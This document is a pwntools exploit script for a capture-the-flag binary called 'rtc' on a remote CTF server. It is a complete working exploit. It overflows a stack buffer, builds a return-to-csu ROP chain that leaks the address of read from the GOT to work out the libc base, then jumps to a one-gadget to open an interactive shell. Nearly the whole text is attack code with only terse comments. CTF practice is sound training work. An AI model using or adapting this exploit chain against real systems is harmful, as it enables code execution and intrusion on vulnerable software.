from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3025)
#r = process("./rtc")
e = ELF("./rtc")
l = ELF("./libc.so.6")
context.log_level = "debug"

r.recvuntil("?\n")

setting_csu = 0x00000000004006BA
excute_cse = 0x00000000004006A0
write_got_add = e.got['write']
read_got_add = e.got['read']
read_got_off = l.sym['read']
main_add = e.sym['main']
oneshot_off = 0x4526a


pay = "A"*0x48 #dummy + sfp
pay += p64(setting_csu) #ret
pay += p64(0) #rbx
pay += p64(1) #rbp
pay += p64(write_got_add) #r12 --> call
pay += p64(8) #r13 --> rdx
pay += p64(read_got_add) #r14 --> rsi
pay += p64(1) #r15 --> edi
pay += p64(excute_cse) #ret

pay += p64(0)*7 #dummy
pay += p64(main_add) #ret

r.send(pay)


leak = u64(r.recv(6) + "\x00\x00")
libc_base = leak - read_got_off
oneshot_add = libc_base + oneshot_off

log.info("leak = " + hex(leak))
log.info("libc_base = " + hex(libc_base))
log.info("oneshot_add = " + hex(oneshot_add))


r.recvuntil("?\n")

pay2 = "A"*0x48 #dummy + sfp
pay2 += p64(oneshot_add)

r.send(pay2)
r.interactive()